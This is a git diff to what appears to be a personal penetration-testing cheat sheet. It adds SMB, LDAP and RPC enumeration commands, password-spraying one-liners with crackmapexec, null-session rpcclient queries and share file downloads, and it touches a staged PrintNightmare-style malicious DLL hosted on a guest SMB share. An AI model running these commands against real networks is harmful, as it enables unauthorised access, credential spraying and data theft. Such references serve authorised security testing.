@@ -128,6 +128,68 @@ Fuzzing vhost routing and web server subdomains with `wfuzz` (below example hide
 wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -H 'Host: FUZZ.target.tld' --hl 1337 $URL
 ```
 
+## SMB Enumeration
+
+Initial scans:
+
+```sh
+# Optimistic attempts at exposed public shares.
+smbclient -L \\\\$HOST
+smbmap -H $HOST
+
+# Authenticated share enumeration.
+smbmap -u 'user' -p 'password' -H $HOST
+crackmapexec smb $HOST -u 'username' -p 'password' --shares
+
+# Authenticated recursive listing of all files.
+smbmap -u 'username' -p 'password' -H $HOST -R
+TODO: cme equivalent
+
+# Authenticated recursive listing of files in one share.
+smbmap -u 'username' -p 'password' -H $HOST -R RedirectedFolders$
+TODO: cme equivalent
+
+# Authenticated file download.
+smbmap -u 'username' -p 'password' -H $HOST --download 'C$\path\to\file.txt'
+TODO: cme equivalent
+
+# Enumeration of a known password across several usernames.
+crackmapexec smb $HOST -u users.lst -p 'known_password' --continue-on-success
+```
+
+## LDAP Enumeration
+
+Initial enumeration:
+
+```sh
+# TODO: Try ldapsearch with authentication.
+ldapsearch -x -h domain.tld -b "dc=domain,dc=tld"
+nmap -vv -n -Pn --script=ldap-search $HOST
+
+# Enumeration of a known password across several usernames.
+crackmapexec ldap $HOST -u users.lst -p 'known_password' --continue-on-success
+```
+
+## RPC Enumeration
+
+Initial enumeration:
+
+```sh
+# Basic cred-less authentication attempts.
+impacket-rpcdump $HOST
+nmap -vv -n -Pn --script=msrpc-enum $HOST
+
+# Null authentication queries via rpcclient.
+rpcclient -U "" -N $HOST -c "enumdomusers; enumdomgroups; querydominfo; dsroledominfo; dsenumdomtrusts"
+
+# Gather other usernames and groups from one set of credentials.
+rpcclient -U 'username%password' -c "enumdomusers" $HOST
+rpcclient -U 'username%password' -c "enumdomgroups" $HOST
+
+# Same as above, but pull out the usernames for easier use with other tools.
+rpcclient -U 'username%password' -c "enumdomusers" $HOST | awk 'NR%2==0 {print $1}' RS='[' FS=']'
+```
+
 ## Local Host Enumeration
 
 This section goes over some automated methods. For manual checks, take a look at [my other pentesting snippet reference](https://pages.brianwel.ch/hacks).
@@ -584,6 +646,8 @@ You can make a variety of Windows applications authenticate to you, leaking info
 
 For a nice reference of payload files and catching authentication attempts with Responder, see [this `ired.team` page](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication).
 
+For discussion of abusing Net-NTLM capturing and relaying in a real-life scenario, see [this blog post](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/).
+
 #### Cracking Net-NTLM Hashes
 
 Because the leaked hashes are Net-NTLM hashes (as opposed to NTLM; read [here](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) for an explanation on the differences), they cannot be used directly in pass-the-hash techniques. However, the original underlying password can be bruteforced:
@@ -693,8 +757,6 @@ Also see [the mimikatz wiki article on decrypting Credential Manager stored cred
 
 ## Common Windows Vulnerabilities
 
-TODO
-
 ### Zerologon
 
 POC is available [here](https://github.com/bb00/zer0dump).
@@ -716,9 +778,9 @@ generate -f dll -o /home/user/payload-hosting/nightmare.dll
 cd ~/payload-hosting
 cat <<EOF >smb.conf
 [myshare]
-	comment = Public Directories
-	path = /home/user/payload-hosting
-	guest ok = Yes
+    comment = Public Directories
+    path = /home/user/payload-hosting
+    guest ok = Yes
 EOF
 sudo smbd --interactive --configfile=./smb.conf
 
@@ -763,7 +825,3 @@ hashcat -m 500 -a 0 hash.lst /usr/share/wordlists/rockyou.txt
 ### Bruteforcing
 
 TODO
-
-### Spraying
-
-TODO: cme?
